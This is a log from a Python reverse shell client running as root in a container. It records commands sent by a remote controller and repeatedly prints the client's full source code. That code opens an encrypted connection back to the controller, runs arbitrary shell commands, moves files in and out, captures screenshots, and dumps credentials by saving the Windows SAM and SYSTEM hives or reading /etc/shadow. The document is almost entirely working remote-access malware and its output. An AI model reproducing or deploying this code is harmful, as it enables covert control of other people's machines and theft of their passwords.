2024-06-29 13:14:54,934 - INFO - Attempting to connect to server...
2024-06-29 13:14:54,934 - INFO - Connected to server
2024-06-29 13:14:54,936 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:14:57,468 - INFO - Received command: ipconfig
2024-06-29 13:14:57,469 - INFO - Handling ipconfig
2024-06-29 13:14:57,472 - INFO - Command output: 172.17.0.5

2024-06-29 13:14:57,472 - INFO - ipconfig result: 172.17.0.5

2024-06-29 13:14:57,472 - INFO - ipconfig handled successfully
2024-06-29 13:31:26,435 - INFO - Connection closed
2024-06-29 13:31:28,875 - INFO - Attempting to connect to server...
2024-06-29 13:31:28,875 - INFO - Connected to server
2024-06-29 13:31:28,877 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:31:33,825 - INFO - Received command: ls
2024-06-29 13:31:33,825 - INFO - Executing command: ls
2024-06-29 13:31:33,826 - INFO - Command output: __pycache__
aes_crypt.py
client.log
client.py
clientfinal.py
clientscreen.py
requirements.txt
test.txt

2024-06-29 13:31:38,263 - INFO - Received command: uptime
2024-06-29 13:31:38,263 - INFO - Executing command: uptime
2024-06-29 13:31:38,269 - ERROR - Command error: /bin/sh: 1: uptime: not found

2024-06-29 13:31:50,015 - INFO - Received command: date
2024-06-29 13:31:50,016 - INFO - Executing command: date
2024-06-29 13:31:50,017 - INFO - Command output: Sat Jun 29 13:31:50 UTC 2024

2024-06-29 13:32:03,078 - INFO - Received command: ls
2024-06-29 13:32:03,078 - INFO - Executing command: ls
2024-06-29 13:32:03,079 - INFO - Command output: __pycache__
aes_crypt.py
client.log
client.py
clientfinal.py
clientscreen.py
requirements.txt
test.txt

2024-06-29 13:32:05,346 - INFO - Received command: whoami
2024-06-29 13:32:05,346 - INFO - Executing command: whoami
2024-06-29 13:32:05,349 - INFO - Command output: root

2024-06-29 13:32:11,077 - INFO - Received command: cat client.py
2024-06-29 13:32:11,077 - INFO - Executing command: cat client.py
2024-06-29 13:32:11,079 - INFO - Command output: import socket
import subprocess
import os
import sys
from aes_crypt import AESCipher
from time import sleep
from base64 import b64encode, b64decode
from PIL import ImageGrab
import platform
import datetime


class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        while True:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                print(f"Connection error: {e}")
                sleep(10)

    def send_client_info(self):
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.send_large_data(client_info)
        except Exception as e:
            print(f"Failed to send client info: {e}")

    def listen_for_commands(self):
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                elif decrypted_data.startswith("hashdump"):
                    self.handle_hashdump()
                elif decrypted_data.startswith("screenshot"):
                    self.handle_screenshot()
                else:
                    self.execute_command(decrypted_data)
        finally:
            self.conn.close()

    def handle_download(self, command):
        file_path = command.split(" ", 1)[1]
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])

        try:
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_search(self, command):
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            command = f"find / -name {file_name} 2>/dev/null"
        result = self.run_system_command(command)
        self.send_large_data(result)

    def handle_hashdump(self):
        if os.name == "nt":
            commands = [
                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
            ]
            result = ""
            for cmd in commands:
                result += self.run_system_command(cmd) + "\n"
        else:
            try:
                result = self.run_system_command(
                    "sudo cat /etc/shadow || cat /etc/shadow"
                )
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output.decode('utf-8')}"
            except Exception as e:
                result = str(e)
        self.send_large_data(result)

    def handle_screenshot(self):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            file_name = f"screenshot_{timestamp}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_name)
            self.send_file(file_name)
            os.remove(file_name)  # Clean up the screenshot file after sending
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def send_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def execute_command(self, command):
        try:
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT
            )
            return output.decode("utf-8")
        except subprocess.CalledProcessError as e:
            return str(e)

    def take_screenshot(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        file_name = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(file_name)
        with open(file_name, "rb") as f:
            return b64encode(f.read()).decode("utf-8")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()

2024-06-29 13:34:16,405 - INFO - Connection closed
2024-06-29 13:34:18,676 - INFO - Attempting to connect to server...
2024-06-29 13:34:18,676 - INFO - Connected to server
2024-06-29 13:34:18,677 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:34:23,775 - INFO - Received command: cat client.py
2024-06-29 13:34:23,775 - INFO - Executing command: cat client.py
2024-06-29 13:34:23,776 - INFO - Command output: import socket
import subprocess
import os
import sys
from aes_crypt import AESCipher
from time import sleep
from base64 import b64encode, b64decode
from PIL import ImageGrab
import platform
import datetime


class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        while True:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                print(f"Connection error: {e}")
                sleep(10)

    def send_client_info(self):
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.send_large_data(client_info)
        except Exception as e:
            print(f"Failed to send client info: {e}")

    def listen_for_commands(self):
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                elif decrypted_data.startswith("hashdump"):
                    self.handle_hashdump()
                elif decrypted_data.startswith("screenshot"):
                    self.handle_screenshot()
                else:
                    self.execute_command(decrypted_data)
        finally:
            self.conn.close()

    def handle_download(self, command):
        file_path = command.split(" ", 1)[1]
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])

        try:
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_search(self, command):
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            command = f"find / -name {file_name} 2>/dev/null"
        result = self.run_system_command(command)
        self.send_large_data(result)

    def handle_hashdump(self):
        if os.name == "nt":
            commands = [
                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
            ]
            result = ""
            for cmd in commands:
                result += self.run_system_command(cmd) + "\n"
        else:
            try:
                result = self.run_system_command(
                    "sudo cat /etc/shadow || cat /etc/shadow"
                )
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output.decode('utf-8')}"
            except Exception as e:
                result = str(e)
        self.send_large_data(result)

    def handle_screenshot(self):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            file_name = f"screenshot_{timestamp}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_name)
            self.send_file(file_name)
            os.remove(file_name)  # Clean up the screenshot file after sending
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def send_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def execute_command(self, command):
        try:
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT
            )
            return output.decode("utf-8")
        except subprocess.CalledProcessError as e:
            return str(e)

    def take_screenshot(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        file_name = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(file_name)
        with open(file_name, "rb") as f:
            return b64encode(f.read()).decode("utf-8")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()

2024-06-29 13:35:02,362 - INFO - Connection closed
2024-06-29 13:35:04,653 - INFO - Attempting to connect to server...
2024-06-29 13:35:04,653 - INFO - Connected to server
2024-06-29 13:35:04,654 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:35:09,858 - INFO - Received command: cat client.py
2024-06-29 13:35:09,858 - INFO - Executing command: cat client.py
2024-06-29 13:35:09,859 - INFO - Command output: import socket
import subprocess
import os
import sys
from aes_crypt import AESCipher
from time import sleep
from base64 import b64encode, b64decode
from PIL import ImageGrab
import platform
import datetime


class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        while True:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                print(f"Connection error: {e}")
                sleep(10)

    def send_client_info(self):
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.send_large_data(client_info)
        except Exception as e:
            print(f"Failed to send client info: {e}")

    def listen_for_commands(self):
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                elif decrypted_data.startswith("hashdump"):
                    self.handle_hashdump()
                elif decrypted_data.startswith("screenshot"):
                    self.handle_screenshot()
                else:
                    self.execute_command(decrypted_data)
        finally:
            self.conn.close()

    def handle_download(self, command):
        file_path = command.split(" ", 1)[1]
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])

        try:
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_search(self, command):
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            command = f"find / -name {file_name} 2>/dev/null"
        result = self.run_system_command(command)
        self.send_large_data(result)

    def handle_hashdump(self):
        if os.name == "nt":
            commands = [
                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
            ]
            result = ""
            for cmd in commands:
                result += self.run_system_command(cmd) + "\n"
        else:
            try:
                result = self.run_system_command(
                    "sudo cat /etc/shadow || cat /etc/shadow"
                )
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output.decode('utf-8')}"
            except Exception as e:
                result = str(e)
        self.send_large_data(result)

    def handle_screenshot(self):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            file_name = f"screenshot_{timestamp}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_name)
            self.send_file(file_name)
            os.remove(file_name)  # Clean up the screenshot file after sending
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def send_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def execute_command(self, command):
        try:
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT
            )
            return output.decode("utf-8")
        except subprocess.CalledProcessError as e:
            return str(e)

    def take_screenshot(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        file_name = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(file_name)
        with open(file_name, "rb") as f:
            return b64encode(f.read()).decode("utf-8")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()

2024-06-29 13:36:21,649 - INFO - Received command: search test
2024-06-29 13:36:21,650 - INFO - Handling search for file: test
2024-06-29 13:36:22,631 - INFO - Command output: /root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/bundled/stubs/django-stubs/test
/root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/typeshed-fallback/stubs/braintree/braintree/test
/root/.vscode-server/extensions/ms-python.python-2024.8.1/python_files/lib/jedilsp/jedi/third_party/django-stubs/django-stubs/test
/root/test
/usr/local/lib/python3.12/site-packages/ccxt/test
/usr/local/lib/python3.12/site-packages/tornado/test
/usr/local/lib/python3.12/site-packages/jedi/third_party/django-stubs/django-stubs/test
/usr/bin/test

2024-06-29 13:36:29,079 - INFO - Received command: search test2
2024-06-29 13:36:29,079 - INFO - Handling search for file: test2
2024-06-29 13:36:29,220 - ERROR - Command error: find: ‘/proc/68476’: No such file or directory
find: ‘/proc/68480’: No such file or directory

2024-06-29 13:36:29,220 - ERROR - Error listening for commands: Data must be aligned to block boundary in ECB mode
2024-06-29 13:36:29,220 - INFO - Connection closed
2024-06-29 13:36:29,220 - INFO - Attempting to connect to server...
2024-06-29 13:36:29,220 - INFO - Connected to server
2024-06-29 13:36:29,220 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:36:36,557 - INFO - Connection closed
2024-06-29 13:36:38,996 - INFO - Attempting to connect to server...
2024-06-29 13:36:38,996 - INFO - Connected to server
2024-06-29 13:36:38,998 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:36:40,435 - INFO - Received command: search test2
2024-06-29 13:36:40,435 - INFO - Handling search for file: test2
2024-06-29 13:36:40,582 - INFO - Command output: 
2024-06-29 13:36:42,838 - INFO - Received command: search test
2024-06-29 13:36:42,838 - INFO - Handling search for file: test
2024-06-29 13:36:42,987 - INFO - Command output: /root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/bundled/stubs/django-stubs/test
/root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/typeshed-fallback/stubs/braintree/braintree/test
/root/.vscode-server/extensions/ms-python.python-2024.8.1/python_files/lib/jedilsp/jedi/third_party/django-stubs/django-stubs/test
/root/test
/usr/local/lib/python3.12/site-packages/ccxt/test
/usr/local/lib/python3.12/site-packages/tornado/test
/usr/local/lib/python3.12/site-packages/jedi/third_party/django-stubs/django-stubs/test
/usr/bin/test

2024-06-29 13:36:44,727 - INFO - Received command: search test2
2024-06-29 13:36:44,728 - INFO - Handling search for file: test2
2024-06-29 13:36:44,872 - INFO - Command output: 
2024-06-29 13:37:01,782 - INFO - Connection closed
2024-06-29 13:45:21,762 - INFO - Attempting to connect to server...
2024-06-29 13:45:21,762 - INFO - Connected to server
2024-06-29 13:45:21,764 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:45:27,122 - INFO - Received command: search test
2024-06-29 13:45:27,123 - INFO - Handling search for file: test
2024-06-29 13:45:27,268 - INFO - Command output: /root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/bundled/stubs/django-stubs/test
/root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/typeshed-fallback/stubs/braintree/braintree/test
/root/.vscode-server/extensions/ms-python.python-2024.8.1/python_files/lib/jedilsp/jedi/third_party/django-stubs/django-stubs/test
/root/test
/usr/local/lib/python3.12/site-packages/ccxt/test
/usr/local/lib/python3.12/site-packages/tornado/test
/usr/local/lib/python3.12/site-packages/jedi/third_party/django-stubs/django-stubs/test
/usr/bin/test

2024-06-29 13:46:34,304 - INFO - Connection closed
2024-06-29 13:46:37,312 - INFO - Attempting to connect to server...
2024-06-29 13:46:37,312 - INFO - Connected to server
2024-06-29 13:46:37,314 - INFO - Sent client info: adc98f0cc4ea|Linux
2024-06-29 13:46:40,618 - INFO - Received command: search test
2024-06-29 13:46:40,618 - INFO - Handling search for file: test
2024-06-29 13:46:40,762 - INFO - Command output: /root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/bundled/stubs/django-stubs/test
/root/.vscode-server/extensions/ms-python.vscode-pylance-2024.6.1/dist/typeshed-fallback/stubs/braintree/braintree/test
/root/.vscode-server/extensions/ms-python.python-2024.8.1/python_files/lib/jedilsp/jedi/third_party/django-stubs/django-stubs/test
/root/test
/usr/local/lib/python3.12/site-packages/ccxt/test
/usr/local/lib/python3.12/site-packages/tornado/test
/usr/local/lib/python3.12/site-packages/jedi/third_party/django-stubs/django-stubs/test
/usr/bin/test

2024-06-29 13:46:43,826 - INFO - Received command: search 2
2024-06-29 13:46:43,826 - INFO - Handling search for file: 2
2024-06-29 13:46:43,965 - INFO - Command output: /root/.vscode-server/extensions/ms-python.python-2024.8.1/python_files/lib/jedilsp/jedi/third_party/typeshed/third_party/2
/root/.vscode-server/extensions/ms-python.python-2024.8.1/python_files/lib/jedilsp/jedi/third_party/typeshed/stdlib/2
/root/.cache/pip/http-v2/b/4/1/2
/root/.cache/pip/http-v2/b/0/c/3/2
/root/.cache/pip/http-v2/4/6/1/f/2
/root/.cache/pip/http-v2/0/3/8/8/2
/root/.cache/pip/http-v2/0/3/6/2
/root/.cache/pip/http-v2/0/1/d/2
/root/.cache/pip/http-v2/0/1/1/2
/root/.cache/pip/http-v2/0/1/1/2/2
/root/.cache/pip/http-v2/0/f/2
/root/.cache/pip/http-v2/0/2
/root/.cache/pip/http-v2/c/b/5/2
/root/.cache/pip/http-v2/c/4/2
/root/.cache/pip/http-v2/c/8/1/5/2
/root/.cache/pip/http-v2/c/8/2
/root/.cache/pip/http-v2/c/e/9/1/2
/root/.cache/pip/http-v2/c/9/1/f/2
/root/.cache/pip/http-v2/8/b/2
/root/.cache/pip/http-v2/8/b/2/4/2
/root/.cache/pip/http-v2/8/e/2
/root/.cache/pip/http-v2/8/2
/root/.cache/pip/http-v2/6/d/f/b/2
/root/.cache/pip/http-v2/6/2
/root/.cache/pip/http-v2/6/9/4/e/2
/root/.cache/pip/http-v2/d/b/8/2
/root/.cache/pip/http-v2/d/0/2
/root/.cache/pip/http-v2/3/a/f/2
/root/.cache/pip/http-v2/3/2
/root/.cache/pip/http-v2/a/2
/root/.cache/pip/http-v2/e/4/5/2
/root/.cache/pip/http-v2/e/0/e/c/2
/root/.cache/pip/http-v2/e/1/0/2
/root/.cache/pip/http-v2/e/1/2
/root/.cache/pip/http-v2/e/1/2/4/2
/root/.cache/pip/http-v2/e/2
/root/.cache/pip/http-v2/1/b/1/2
/root/.cache/pip/http-v2/1/c/1/2
/root/.cache/pip/http-v2/1/9/2
/root/.cache/pip/http-v2/1/9/2/8/2
/root/.cache/pip/http-v2/f/5/2
/root/.cache/pip/http-v2/f/2
/root/.cache/pip/http-v2/f/2/2
/root/.cache/pip/http-v2/5/d/8/6/2
/root/.cache/pip/http-v2/2
/root/.cache/pip/http-v2/2/6/7/d/2
/root/.cache/pip/http-v2/2/f/3/2
/root/.cache/pip/http-v2/2/2
/root/.cache/pip/http-v2/9/7/2
/root/.cache/pip/http-v2/9/7/2/2
/root/.cache/pip/http-v2/9/4/5/2
/root/.cache/pip/http-v2/9/0/5/2
/root/.cache/pip/http-v2/9/3/4/2
/root/.cache/pip/http-v2/9/1/2
/root/.cache/pip/http-v2/9/2
/sys/kernel/irq/2
/sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/fd1d2cbd-ce7c-535c-966b-eb5f811c95f0/channels/2
/sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/fd1d2cbd-ce7c-535c-966b-eb5f811c95f0/host0/target0:0:0/0:0:0:3/block/sdd/mq/2
/sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/fd1d2cbd-ce7c-535c-966b-eb5f811c95f0/host0/target0:0:0/0:0:0:1/block/sdb/mq/2
/sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/fd1d2cbd-ce7c-535c-966b-eb5f811c95f0/host0/target0:0:0/0:0:0:2/block/sdc/mq/2
/sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/fd1d2cbd-ce7c-535c-966b-eb5f811c95f0/host0/target0:0:0/0:0:0:0/block/sda/mq/2
/proc/irq/2
/proc/sys/net/netfilter/nf_log/2
/proc/1/task/1/fd/2
/proc/1/task/1/fdinfo/2
/proc/1/fd/2
/proc/1/fdinfo/2
/proc/135/task/135/fd/2
/proc/135/task/135/fdinfo/2
/proc/135/fd/2
/proc/135/fdinfo/2
/proc/147/task/147/fd/2
/proc/147/task/147/fdinfo/2
/proc/147/task/148/fd/2
/proc/147/task/148/fdinfo/2
/proc/147/task/149/fd/2
/proc/147/task/149/fdinfo/2
/proc/147/task/150/fd/2
/proc/147/task/150/fdinfo/2
/proc/147/task/151/fd/2
/proc/147/task/151/fdinfo/2
/proc/147/task/152/fd/2
/proc/147/task/152/fdinfo/2
/proc/147/task/153/fd/2
/proc/147/task/153/fdinfo/2
/proc/147/fd/2
/proc/147/fdinfo/2
/proc/154/task/154/fd/2
/proc/154/task/154/fdinfo/2
/proc/154/fd/2
/proc/154/fdinfo/2
/proc/163/task/163/fd/2
/proc/163/task/163/fdinfo/2
/proc/163/task/164/fd/2
/proc/163/task/164/fdinfo/2
/proc/163/task/165/fd/2
/proc/163/task/165/fdinfo/2
/proc/163/task/166/fd/2
/proc/163/task/166/fdinfo/2
/proc/163/task/167/fd/2
/proc/163/task/167/fdinfo/2
/proc/163/task/168/fd/2
/proc/163/task/168/fdinfo/2
/proc/163/task/172/fd/2
/proc/163/task/172/fdinfo/2
/proc/163/task/177/fd/2
/proc/163/task/177/fdinfo/2
/proc/163/task/178/fd/2
/proc/163/task/178/fdinfo/2
/proc/163/task/179/fd/2
/proc/163/task/179/fdinfo/2
/proc/163/task/180/fd/2
/proc/163/task/180/fdinfo/2
/proc/163/fd/2
/proc/163/fdinfo/2
/proc/253/task/253/fd/2
/proc/253/task/253/fdinfo/2
/proc/253/task/254/fd/2
/proc/253/task/254/fdinfo/2
/proc/253/task/255/fd/2
/proc/253/task/255/fdinfo/2
/proc/253/task/256/fd/2
/proc/253/task/256/fdinfo/2
/proc/253/task/257/fd/2
/proc/253/task/257/fdinfo/2
/proc/253/task/258/fd/2
/proc/253/task/258/fdinfo/2
/proc/253/task/265/fd/2
/proc/253/task/265/fdinfo/2
/proc/253/task/267/fd/2
/proc/253/task/267/fdinfo/2
/proc/253/task/268/fd/2
/proc/253/task/268/fdinfo/2
/proc/253/task/269/fd/2
/proc/253/task/269/fdinfo/2
/proc/253/task/270/fd/2
/proc/253/task/270/fdinfo/2
/proc/253/task/271/fd/2
/proc/253/task/271/fdinfo/2
/proc/253/task/272/fd/2
/proc/253/task/272/fdinfo/2
/proc/253/fd/2
/proc/253/fdinfo/2
/proc/416/task/416/fd/2
/proc/416/task/416/fdinfo/2
/proc/416/task/417/fd/2
/proc/416/task/417/fdinfo/2
/proc/416/task/418/fd/2
/proc/416/task/418/fdinfo/2
/proc/416/task/419/fd/2
/proc/416/task/419/fdinfo/2
/proc/416/task/420/fd/2
/proc/416/task/420/fdinfo/2
/proc/416/task/421/fd/2
/proc/416/task/421/fdinfo/2
